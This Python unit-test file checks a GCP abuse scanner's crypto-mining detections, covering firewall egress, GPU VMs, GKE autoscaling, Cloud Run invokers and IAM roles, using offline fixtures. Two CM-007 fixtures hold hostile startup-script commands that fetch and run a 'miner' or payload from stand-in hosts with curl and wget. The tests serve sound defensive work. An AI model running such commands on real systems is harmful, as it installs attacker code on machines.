"""Unit tests for extended crypto mining checks — offline, using inventory fixtures."""

from __future__ import annotations

from gcp_abuse_scanner.checks.crypto_mining.cm_cloudrun import (
    CM030CloudRunPublicInvoker,
    CM031CloudRunUnboundedMaxScale,
)
from gcp_abuse_scanner.checks.crypto_mining.cm_compute_extended import (
    CM002OrgPolicyExternalIPNotRestricted,
    CM003FirewallEgressPermissive,
    CM005VMsWithGPUNoRestriction,
    CM006InsecureInstanceMetadata,
    CM007StartupScriptExternalDownload,
    CM011NoResourceLocationRestriction,
)
from gcp_abuse_scanner.checks.crypto_mining.cm_gke import (
    CM020GKENodePoolUnboundedAutoscaling,
    CM021GKENAPNoResourceLimits,
    CM023GKEPublicControlPlaneNoAuthorizedNetworks,
    CM024WorkloadIdentityDisabled,
    CM025LegacyABACEnabled,
    CM026NodePoolDefaultComputeSA,
)
from gcp_abuse_scanner.checks.crypto_mining.cm_iam_extended import (
    CM040BroadComputeCreationRoles,
    CM042BroadServiceAccountActAs,
    CM045RecommenderOverpermissionedSA,
    CM046PersonalAccountPrivilegedRole,
    CM050NoEgressRestriction,
    CM060NoBudgetAlert,
)
from gcp_abuse_scanner.models.finding import FindingStatus, Severity
from gcp_abuse_scanner.models.inventory import (
    BudgetInfo,
    CloudRunService,
    ComputeInstance,
    FirewallRule,
    GKECluster,
    IAMBinding,
    OrgPolicy,
    ResourceInventory,
)

# ---------------------------------------------------------------------------
# CM-002: Org Policy compute.vmExternalIpAccess
# ---------------------------------------------------------------------------


class TestCM002OrgPolicyExternalIPNotRestricted:
    def test_fail_when_external_ip_policy_not_set(self) -> None:
        """No org policy entry for the constraint → FAIL."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            organization_id="123456789",
            org_policies=[],  # no policy at all
        )
        check = CM002OrgPolicyExternalIPNotRestricted()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-002"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["constraint"] == "constraints/compute.vmExternalIpAccess"

    def test_fail_when_policy_has_allow_all(self) -> None:
        """Policy exists but has allowAll → still FAIL."""
        policy = OrgPolicy(
            resource="organizations/123456789",
            constraint="constraints/compute.vmExternalIpAccess",
            policy={"spec": {"rules": [{"allowAll": "TRUE"}]}},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            organization_id="123456789",
            org_policies=[policy],
        )
        check = CM002OrgPolicyExternalIPNotRestricted()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-002"
        assert findings[0].status == FindingStatus.FAIL

    def test_pass_when_deny_all_policy_set(self) -> None:
        """Policy with denyAll → PASS (no findings)."""
        policy = OrgPolicy(
            resource="organizations/123456789",
            constraint="constraints/compute.vmExternalIpAccess",
            policy={"spec": {"rules": [{"denyAll": "TRUE"}]}},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            organization_id="123456789",
            org_policies=[policy],
        )
        check = CM002OrgPolicyExternalIPNotRestricted()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-003: Firewall allows unrestricted egress
# ---------------------------------------------------------------------------


class TestCM003FirewallEgressPermissive:
    def test_fail_when_egress_open_to_internet(self) -> None:
        """Active EGRESS rule with destination 0.0.0.0/0 and low priority → FAIL."""
        rule = FirewallRule(
            name="allow-all-egress",
            project_id="test-project",
            network="default",
            direction="EGRESS",
            priority=1000,
            destination_ranges=["0.0.0.0/0"],
            allowed=[{"IPProtocol": "all"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM003FirewallEgressPermissive()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-003"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["rule_name"] == "allow-all-egress"

    def test_fail_when_egress_open_to_ipv6_internet(self) -> None:
        """::/0 destination also triggers FAIL."""
        rule = FirewallRule(
            name="allow-all-egress-v6",
            project_id="test-project",
            network="default",
            direction="EGRESS",
            priority=500,
            destination_ranges=["::/0"],
            allowed=[{"IPProtocol": "all"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM003FirewallEgressPermissive()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-003"

    def test_pass_when_no_permissive_egress(self) -> None:
        """No EGRESS rules → PASS."""
        rule = FirewallRule(
            name="allow-internal-ingress",
            project_id="test-project",
            network="default",
            direction="INGRESS",
            priority=1000,
            source_ranges=["10.0.0.0/8"],
            allowed=[{"IPProtocol": "tcp"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM003FirewallEgressPermissive()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_egress_rule_disabled(self) -> None:
        """Disabled EGRESS rule → PASS."""
        rule = FirewallRule(
            name="allow-all-egress-disabled",
            project_id="test-project",
            network="default",
            direction="EGRESS",
            priority=1000,
            destination_ranges=["0.0.0.0/0"],
            allowed=[{"IPProtocol": "all"}],
            disabled=True,
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM003FirewallEgressPermissive()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_egress_rule_is_default_priority(self) -> None:
        """EGRESS rule at priority >= 65534 (GCP implied rule) → PASS."""
        rule = FirewallRule(
            name="implied-allow-egress",
            project_id="test-project",
            network="default",
            direction="EGRESS",
            priority=65534,
            destination_ranges=["0.0.0.0/0"],
            allowed=[{"IPProtocol": "all"}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            firewall_rules=[rule],
        )
        check = CM003FirewallEgressPermissive()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-005: VM instances with GPU accelerators
# ---------------------------------------------------------------------------


class TestCM005VMsWithGPUNoRestriction:
    def test_fail_when_vm_has_gpu(self) -> None:
        """VM with GPU accelerator → FAIL."""
        instance = ComputeInstance(
            name="gpu-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-4",
            status="RUNNING",
            accelerators=[{"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 1}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM005VMsWithGPUNoRestriction()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-005"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].evidence["instance_name"] == "gpu-vm"
        assert len(findings[0].evidence["gpu_accelerators"]) == 1

    def test_pass_when_no_gpu(self) -> None:
        """VM without accelerators → PASS."""
        instance = ComputeInstance(
            name="regular-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-4",
            status="RUNNING",
            accelerators=[],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM005VMsWithGPUNoRestriction()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_accelerator_count_is_zero(self) -> None:
        """Accelerator entry with count=0 → PASS."""
        instance = ComputeInstance(
            name="no-gpu-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-4",
            status="RUNNING",
            accelerators=[{"acceleratorType": "nvidia-tesla-t4", "acceleratorCount": 0}],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM005VMsWithGPUNoRestriction()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-006: Insecure instance metadata
# ---------------------------------------------------------------------------


class TestCM006InsecureInstanceMetadata:
    def test_fail_when_serial_port_enabled(self) -> None:
        """serial-port-enable=true → FAIL with serial_port_enabled flag."""
        instance = ComputeInstance(
            name="serial-port-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={"serial-port-enable": "true"},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM006InsecureInstanceMetadata()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-006"
        assert findings[0].status == FindingStatus.FAIL
        assert "serial_port_enabled" in findings[0].evidence["insecure_flags"]

    def test_fail_when_oslogin_disabled(self) -> None:
        """enable-oslogin=false → FAIL with oslogin_disabled flag."""
        instance = ComputeInstance(
            name="no-oslogin-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={"enable-oslogin": "false"},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM006InsecureInstanceMetadata()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-006"
        assert "oslogin_disabled" in findings[0].evidence["insecure_flags"]

    def test_fail_when_both_flags_insecure(self) -> None:
        """Both serial port enabled and OS Login disabled → FAIL with both flags."""
        instance = ComputeInstance(
            name="insecure-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={
                "serial-port-enable": "1",
                "enable-oslogin": "false",
            },
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM006InsecureInstanceMetadata()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        flags = findings[0].evidence["insecure_flags"]
        assert "serial_port_enabled" in flags
        assert "oslogin_disabled" in flags

    def test_pass_when_metadata_secure(self) -> None:
        """serial-port-enable=false and enable-oslogin=true → PASS."""
        instance = ComputeInstance(
            name="secure-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={
                "serial-port-enable": "false",
                "enable-oslogin": "true",
            },
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM006InsecureInstanceMetadata()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_no_metadata(self) -> None:
        """No metadata keys → PASS (defaults are not flagged)."""
        instance = ComputeInstance(
            name="no-metadata-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM006InsecureInstanceMetadata()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-007: Startup script with external downloads
# ---------------------------------------------------------------------------


class TestCM007StartupScriptExternalDownload:
    def test_fail_when_startup_script_has_curl(self) -> None:
        """Startup script with 'curl ' → FAIL."""
        instance = ComputeInstance(
            name="curl-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={"startup-script": "#!/bin/bash\ncurl https://evil.example.com/miner | bash"},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM007StartupScriptExternalDownload()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-007"
        assert findings[0].status == FindingStatus.FAIL
        assert "curl " in findings[0].evidence["matched_patterns"]

    def test_fail_when_startup_script_has_wget(self) -> None:
        """Startup script with 'wget ' → FAIL."""
        instance = ComputeInstance(
            name="wget-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={
                "startup-script": "#!/bin/bash\nwget http://malicious.example.com/payload -O /tmp/run.sh"
            },
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM007StartupScriptExternalDownload()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert "wget " in findings[0].evidence["matched_patterns"]

    def test_pass_when_no_external_download(self) -> None:
        """Startup script with no suspicious patterns → PASS."""
        instance = ComputeInstance(
            name="safe-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={"startup-script": "#!/bin/bash\necho 'Hello, World!'\nsystemctl start myapp"},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM007StartupScriptExternalDownload()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_no_startup_script(self) -> None:
        """No startup-script metadata key → PASS."""
        instance = ComputeInstance(
            name="no-script-vm",
            project_id="test-project",
            zone="us-central1-a",
            machine_type="n1-standard-2",
            status="RUNNING",
            metadata={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            compute_instances=[instance],
        )
        check = CM007StartupScriptExternalDownload()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-011: Org Policy gcp.resourceLocations
# ---------------------------------------------------------------------------


class TestCM011NoResourceLocationRestriction:
    def test_fail_when_resource_location_not_set(self) -> None:
        """No org policy for gcp.resourceLocations → FAIL."""
        inventory = ResourceInventory(
            project_ids=["test-project"],
            organization_id="123456789",
            org_policies=[],
        )
        check = CM011NoResourceLocationRestriction()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-011"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].evidence["constraint"] == "constraints/gcp.resourceLocations"

    def test_fail_when_policy_exists_but_no_allowed_values(self) -> None:
        """Policy exists but has no allowedValues → FAIL."""
        policy = OrgPolicy(
            resource="organizations/123456789",
            constraint="constraints/gcp.resourceLocations",
            policy={"spec": {"rules": [{"values": {"allowedValues": []}}]}},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            organization_id="123456789",
            org_policies=[policy],
        )
        check = CM011NoResourceLocationRestriction()
        findings = check.evaluate(inventory)
        # Empty allowedValues means no restriction in _has_location_restriction
        assert len(findings) == 1
        assert findings[0].check_id == "CM-011"

    def test_pass_when_location_restricted(self) -> None:
        """Policy with allowedValues containing regions → PASS."""
        policy = OrgPolicy(
            resource="organizations/123456789",
            constraint="constraints/gcp.resourceLocations",
            policy={
                "spec": {
                    "rules": [{"values": {"allowedValues": ["in:us-locations", "in:eu-locations"]}}]
                }
            },
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            organization_id="123456789",
            org_policies=[policy],
        )
        check = CM011NoResourceLocationRestriction()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-020: GKE node pool unbounded autoscaling
# ---------------------------------------------------------------------------


class TestCM020GKENodePoolUnboundedAutoscaling:
    def test_fail_when_max_node_count_zero(self) -> None:
        """Node pool with autoscaling enabled and maxNodeCount=0 → FAIL."""
        cluster = GKECluster(
            name="my-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "autoscaling": {
                        "enabled": True,
                        "maxNodeCount": 0,
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM020GKENodePoolUnboundedAutoscaling()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-020"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["node_pool_name"] == "default-pool"
        assert findings[0].evidence["max_node_count"] == 0

    def test_fail_when_max_node_count_none(self) -> None:
        """Node pool with autoscaling enabled and no maxNodeCount → FAIL."""
        cluster = GKECluster(
            name="my-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "autoscaling": {
                        "enabled": True,
                        # maxNodeCount absent
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM020GKENodePoolUnboundedAutoscaling()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-020"

    def test_pass_when_max_node_count_set(self) -> None:
        """Node pool with autoscaling enabled and reasonable maxNodeCount → PASS."""
        cluster = GKECluster(
            name="my-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "autoscaling": {
                        "enabled": True,
                        "maxNodeCount": 10,
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM020GKENodePoolUnboundedAutoscaling()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_autoscaling_disabled(self) -> None:
        """Node pool with autoscaling disabled → PASS."""
        cluster = GKECluster(
            name="my-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "autoscaling": {
                        "enabled": False,
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM020GKENodePoolUnboundedAutoscaling()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-021: GKE NAP without resource limits
# ---------------------------------------------------------------------------


class TestCM021GKENAPNoResourceLimits:
    def test_fail_when_nap_pool_no_limits(self) -> None:
        """Cluster with autoprovisioned node pool → FAIL."""
        cluster = GKECluster(
            name="nap-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "nap-pool",
                    "autoscaling": {
                        "enabled": True,
                        "autoprovisioned": True,
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM021GKENAPNoResourceLimits()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-021"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert "nap-pool" in findings[0].evidence["autoprovisioned_pools"]

    def test_pass_when_no_autoprovisioned_pools(self) -> None:
        """Cluster with only regular node pools → PASS."""
        cluster = GKECluster(
            name="regular-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "autoscaling": {
                        "enabled": True,
                        "autoprovisioned": False,
                        "maxNodeCount": 5,
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM021GKENAPNoResourceLimits()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_autopilot_cluster(self) -> None:
        """Autopilot cluster is skipped → PASS."""
        cluster = GKECluster(
            name="autopilot-cluster",
            project_id="test-project",
            location="us-central1",
            autopilot={"enabled": True},
            node_pools=[
                {
                    "name": "nap-pool",
                    "autoscaling": {
                        "enabled": True,
                        "autoprovisioned": True,
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM021GKENAPNoResourceLimits()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-023: GKE public cluster without authorized networks
# ---------------------------------------------------------------------------


class TestCM023GKEPublicControlPlaneNoAuthorizedNetworks:
    def test_fail_when_public_cluster_no_authorized_networks(self) -> None:
        """Public cluster with no authorized networks → FAIL."""
        cluster = GKECluster(
            name="public-cluster",
            project_id="test-project",
            location="us-central1",
            endpoint="34.1.2.3",
            master_authorized_networks_config={},  # not enabled
            private_cluster_config={},  # not private
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM023GKEPublicControlPlaneNoAuthorizedNetworks()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-023"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["cluster_name"] == "public-cluster"

    def test_pass_when_authorized_networks_set(self) -> None:
        """Public cluster with authorized networks enabled → PASS."""
        cluster = GKECluster(
            name="restricted-cluster",
            project_id="test-project",
            location="us-central1",
            endpoint="34.1.2.3",
            master_authorized_networks_config={
                "enabled": True,
                "cidrBlocks": [{"cidrBlock": "10.0.0.0/8"}],
            },
            private_cluster_config={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM023GKEPublicControlPlaneNoAuthorizedNetworks()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_private_cluster(self) -> None:
        """Private cluster (enablePrivateNodes=True) → PASS."""
        cluster = GKECluster(
            name="private-cluster",
            project_id="test-project",
            location="us-central1",
            endpoint="",
            master_authorized_networks_config={},
            private_cluster_config={"enablePrivateNodes": True},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM023GKEPublicControlPlaneNoAuthorizedNetworks()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-024: Workload Identity disabled
# ---------------------------------------------------------------------------


class TestCM024WorkloadIdentityDisabled:
    def test_fail_when_workload_identity_disabled(self) -> None:
        """Cluster with no workload_identity_config → FAIL."""
        cluster = GKECluster(
            name="no-wi-cluster",
            project_id="test-project",
            location="us-central1",
            workload_identity_config={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM024WorkloadIdentityDisabled()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-024"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.MEDIUM

    def test_pass_when_workload_identity_enabled(self) -> None:
        """Cluster with workloadPool configured → PASS."""
        cluster = GKECluster(
            name="wi-cluster",
            project_id="test-project",
            location="us-central1",
            workload_identity_config={"workloadPool": "test-project.svc.id.goog"},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM024WorkloadIdentityDisabled()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-025: Legacy ABAC enabled
# ---------------------------------------------------------------------------


class TestCM025LegacyABACEnabled:
    def test_fail_when_legacy_abac_enabled(self) -> None:
        """Cluster with legacy_abac.enabled=True → FAIL."""
        cluster = GKECluster(
            name="abac-cluster",
            project_id="test-project",
            location="us-central1",
            legacy_abac={"enabled": True},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM025LegacyABACEnabled()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-025"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].evidence["legacy_abac"] == {"enabled": True}

    def test_pass_when_legacy_abac_disabled(self) -> None:
        """Cluster with legacy_abac.enabled=False → PASS."""
        cluster = GKECluster(
            name="rbac-cluster",
            project_id="test-project",
            location="us-central1",
            legacy_abac={"enabled": False},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM025LegacyABACEnabled()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_legacy_abac_not_set(self) -> None:
        """Cluster with no legacy_abac config → PASS."""
        cluster = GKECluster(
            name="default-cluster",
            project_id="test-project",
            location="us-central1",
            legacy_abac={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM025LegacyABACEnabled()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-026: Node pool uses default Compute Engine SA
# ---------------------------------------------------------------------------


class TestCM026NodePoolDefaultComputeSA:
    def test_fail_when_node_pool_uses_default_sa(self) -> None:
        """Node pool with @developer.gserviceaccount.com SA → FAIL."""
        cluster = GKECluster(
            name="default-sa-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "config": {"serviceAccount": "123456789-compute@developer.gserviceaccount.com"},
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM026NodePoolDefaultComputeSA()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-026"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert "developer.gserviceaccount.com" in findings[0].evidence["service_account"]

    def test_fail_when_node_pool_uses_default_keyword(self) -> None:
        """Node pool with serviceAccount='default' → FAIL."""
        cluster = GKECluster(
            name="default-sa-cluster-2",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "config": {"serviceAccount": "default"},
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM026NodePoolDefaultComputeSA()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-026"

    def test_pass_when_node_pool_uses_custom_sa(self) -> None:
        """Node pool with a custom SA → PASS."""
        cluster = GKECluster(
            name="custom-sa-cluster",
            project_id="test-project",
            location="us-central1",
            node_pools=[
                {
                    "name": "default-pool",
                    "config": {
                        "serviceAccount": "gke-node-sa@test-project.iam.gserviceaccount.com"
                    },
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            gke_clusters=[cluster],
        )
        check = CM026NodePoolDefaultComputeSA()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-030: Cloud Run public invoker
# ---------------------------------------------------------------------------


class TestCM030CloudRunPublicInvoker:
    def test_fail_when_all_users_invoker(self) -> None:
        """Cloud Run service with allUsers as invoker → FAIL."""
        service = CloudRunService(
            name="public-service",
            project_id="test-project",
            region="us-central1",
            iam_bindings=[
                {
                    "role": "roles/run.invoker",
                    "members": ["allUsers"],
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM030CloudRunPublicInvoker()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-030"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
        assert findings[0].evidence["service_name"] == "public-service"
        assert len(findings[0].evidence["offending_bindings"]) == 1

    def test_pass_when_no_public_invoker(self) -> None:
        """Cloud Run service with only specific SA as invoker → PASS."""
        service = CloudRunService(
            name="private-service",
            project_id="test-project",
            region="us-central1",
            iam_bindings=[
                {
                    "role": "roles/run.invoker",
                    "members": ["serviceAccount:caller@test-project.iam.gserviceaccount.com"],
                }
            ],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM030CloudRunPublicInvoker()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_no_iam_bindings(self) -> None:
        """Cloud Run service with no IAM bindings → PASS."""
        service = CloudRunService(
            name="no-binding-service",
            project_id="test-project",
            region="us-central1",
            iam_bindings=[],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM030CloudRunPublicInvoker()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-031: Cloud Run unbounded max scale
# ---------------------------------------------------------------------------


class TestCM031CloudRunUnboundedMaxScale:
    def test_fail_when_max_scale_not_set(self) -> None:
        """Cloud Run service with no maxInstanceCount → FAIL."""
        service = CloudRunService(
            name="unbounded-service",
            project_id="test-project",
            region="us-central1",
            scaling={},  # no maxInstanceCount
            template={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM031CloudRunUnboundedMaxScale()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-031"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.MEDIUM
        assert findings[0].evidence["resolved_max_instances"] is None

    def test_fail_when_max_scale_is_zero(self) -> None:
        """Cloud Run service with maxInstanceCount=0 → FAIL."""
        service = CloudRunService(
            name="zero-scale-service",
            project_id="test-project",
            region="us-central1",
            scaling={"maxInstanceCount": 0},
            template={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM031CloudRunUnboundedMaxScale()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-031"

    def test_pass_when_max_scale_configured(self) -> None:
        """Cloud Run service with maxInstanceCount=100 → PASS."""
        service = CloudRunService(
            name="bounded-service",
            project_id="test-project",
            region="us-central1",
            scaling={"maxInstanceCount": 100},
            template={},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM031CloudRunUnboundedMaxScale()
        findings = check.evaluate(inventory)
        assert findings == []

    def test_pass_when_max_scale_in_template(self) -> None:
        """Cloud Run service with maxInstanceCount in template.scaling → PASS."""
        service = CloudRunService(
            name="template-bounded-service",
            project_id="test-project",
            region="us-central1",
            scaling={},
            template={"scaling": {"maxInstanceCount": 50}},
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            cloud_run_services=[service],
        )
        check = CM031CloudRunUnboundedMaxScale()
        findings = check.evaluate(inventory)
        assert findings == []


# ---------------------------------------------------------------------------
# CM-040: Broad compute creation roles
# ---------------------------------------------------------------------------


class TestCM040BroadComputeCreationRoles:
    def test_fail_when_compute_admin_granted_broadly(self) -> None:
        """roles/compute.admin granted to allUsers → FAIL."""
        binding = IAMBinding(
            resource="projects/test-project",
            resource_type="cloudresourcemanager.googleapis.com/Project",
            project_id="test-project",
            role="roles/compute.admin",
            members=["allUsers"],
        )
        inventory = ResourceInventory(
            project_ids=["test-project"],
            iam_bindings=[binding],
        )
        check = CM040BroadComputeCreationRoles()
        findings = check.evaluate(inventory)
        assert len(findings) == 1
        assert findings[0].check_id == "CM-040"
        assert findings[0].status == FindingStatus.FAIL
        assert findings[0].severity == Severity.HIGH
